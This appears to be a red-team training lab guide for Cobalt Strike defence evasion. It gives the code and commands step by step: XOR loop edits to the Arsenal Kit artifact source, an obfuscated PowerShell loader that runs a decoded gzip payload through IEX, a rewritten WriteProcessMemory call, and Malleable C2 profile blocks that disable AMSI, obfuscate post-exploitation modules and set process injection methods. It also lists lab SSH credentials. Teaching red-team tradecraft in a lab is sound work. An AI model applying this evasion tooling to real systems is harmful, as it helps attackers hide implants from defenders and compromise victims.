
### Defence Evasion Lab

#### Artifacts
- Launch Visual Studio Code.
    
-  Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\arsenal-kit\kits\artifact_.
    
-  Navigate to _src-common_ and open _patch.c_.
    
-  Scroll to line ~45 and modify the _for_ loop. This is for the svc exe payloads.
    
    cTypeCopy
    
    `x = length; while(x--) {   *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8]; }`
    
-  Scroll to line ~116 and modify the other _for_ loop. This is for the normal exe payloads.
    
    cTypeCopy
    
    `int x = length; while(x--) {   *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; }`
    
-  Save the changes (**File > Save**) and close the folder (**File > Close Folder**).
    
-  On the Windows taskbar, right-click on the Terminal icon launch Ubuntu.
    
-  Change the working directory.
    
    1. cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
-  Run **build.sh** to build the new artifacts.
    
    1. ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
-  Open the Cobalt Strike client and load **artifact.cna** from _C:\Tools\cobaltstrike\custom-artifacts\mailslot_.

### Resources

1.  If not already open from the previous task, launch Ubuntu from the Windows Terminal.
    
2.  Change the working directory.
    
    1. cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
3.  Run **build.sh** to build new resources.
    
    1. ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
4.  If not already open from the previous task, launch Visual Studio Code.
    
5.  Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\custom-resources_.
    
6.  Select **template.x64.ps1**.
    
7.  Rename the _func_get_proc_address_ function on line 3 to _get_proc_address_.
    
8.  Rename the _func_get_delegate_type_ function on line 10 to _get_delegate_type_.
    
    > Use **Edit > Replace**.
    
9.  Scroll to line 32 and replace it with:
    
    powershellTypeCopy
    
    `$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))) $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)`
    
10.  Save the changes (**File > Save**).
    
11.  Select **compress.ps1**.
    
12.  Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:
    
    powershellTypeCopy
    
    ``SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();``
    
13.  Save the changes (**File > Save**).
    
14.  Open the Cobalt Strike client and load **resources.cna** from _C:\Tools\cobaltstrike\custom-resources_.

### Malleable C2

1.  Open a new PowerShell window in Terminal.
    
2.  SSH into the team server VM.
    
    1. ssh attacker@10.0.0.5
    
    > The password is Passw0rd!.
    
3.  Move into the profiles directory.
    
    1. cd /opt/cobaltstrike/profiles
4.  Open **default.profile** in a text editor (e.g. vim or nano).
    
5.  Add the following stage block:
    
    c2profileTypeCopy
    
    `stage {    set userwx "false";    set module_x64 "Hydrogen.dll";  # use a different module if you like    set copy_pe_header "false"; }`
    
6.  Add the following post-ex block:
    
    c2profileTypeCopy
    
    `post-ex {   set amsi_disable "true";   set spawnto_x64 "%windir%\\sysnative\\svchost.exe";   set obfuscate "true";   set cleanup "true";    transform-x64 {       strrep "ReflectiveLoader" "NetlogonMain";       strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";       strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";        # add any other transforms that you want   } }`
    
7.  Add the following process-inject block:
    
    c2profileTypeCopy
    
    `process-inject {   execute {       NtQueueApcThread-s;       NtQueueApcThread;       SetThreadContext;       RtlCreateUserThread;       CreateThread;   } }`
    
8.  Save the changes.
    
9.  Restart the team server.
    
    1. sudo /usr/bin/docker restart cobaltstrike-cs-1
    
    > If the container fails to restart properly use sudo /usr/bin/docker logs cobaltstrike-cs-1 to see the profile errors.